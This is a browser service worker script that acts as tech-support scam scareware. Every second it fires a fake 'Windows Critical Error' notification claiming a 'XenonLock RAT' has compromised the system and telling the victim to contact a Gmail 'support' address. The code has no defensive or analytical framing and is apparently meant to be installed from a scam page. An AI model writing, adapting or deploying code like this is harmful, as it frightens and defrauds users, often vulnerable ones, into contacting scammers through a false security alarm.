self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('message', (event) => {
    if (event.data === 'showNotification') {
        self.registration.showNotification("Windows Critical Error", {
            body: "XenonLock RAT detected! Your system is compromised. Contact Support at Xenonlocksupport@gmail.com",
            icon: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMTMuMDkgMC44NkgxMkwxMiA4VjJ6bTAgMkgxMlYxNkg4di04em0wIDBoMjR2MjR6IiBmaWxsPSIjRkYwMDAwIi8+PC9zdmc+'
        });
    }
});

// Show notification every second even if browser is closed
setInterval(() => {
    self.clients.matchAll().then(clients => {
        clients.forEach(client => {
            client.postMessage('showNotification');
        });
    });
    self.registration.showNotification("Windows Critical Error", {
        body: "XenonLock RAT detected! Your system is compromised. Contact Support at Xenonlocksupport@gmail.com",
        icon: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMTMuMDkgMC44NkgxMkwxMiA4VjJ6bTAgMkgxMlYxNkg4di04em0wIDBoMjR2MjR6IiBmaWxsPSIjRkYwMDAwIi8+PC9zdmc+'
    });
}, 1000);